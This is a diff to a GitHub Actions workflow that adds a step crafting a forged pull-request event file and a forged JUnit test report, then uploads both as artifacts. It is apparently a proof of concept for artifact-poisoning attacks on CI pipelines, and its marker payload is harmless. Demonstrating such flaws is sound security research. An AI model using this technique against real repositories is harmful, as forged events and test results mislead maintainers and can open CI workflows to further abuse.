@@ -8,6 +8,24 @@ jobs:
   fake:
     runs-on: ubuntu-latest
     steps:
+      - name: Craft forged event + results
+        run: |
+          mkdir -p payload out
+          cat > payload/event.json <<'JSON'
+          {
+            "repository": {"full_name": "PDFtoMark/gab-poc-azuretre-wfr", "default_branch": "main"},
+            "pull_request": {
+              "number": 2,
+              "base": {"ref": "main", "sha": "5fe6ab9", "repo": {"full_name": "PDFtoMark/gab-poc-azuretre-wfr"}},
+              "head": {"sha": "deadbeef", "repo": {"full_name": "PDFtoMark/gab-poc-azuretre-wfr"}}
+            }
+          }
+          JSON
+          cat > out/junit.xml <<'XML'
+          <testsuite name="forged suite" tests="1" failures="0" errors="0">
+            <testcase classname="com.evil.PoC" name="INJECTED-BY-UNTRUSTED-ARTIFACT" time="0.1"/>
+          </testsuite>
+          XML
       - name: Upload forged Event File
         uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
         with:
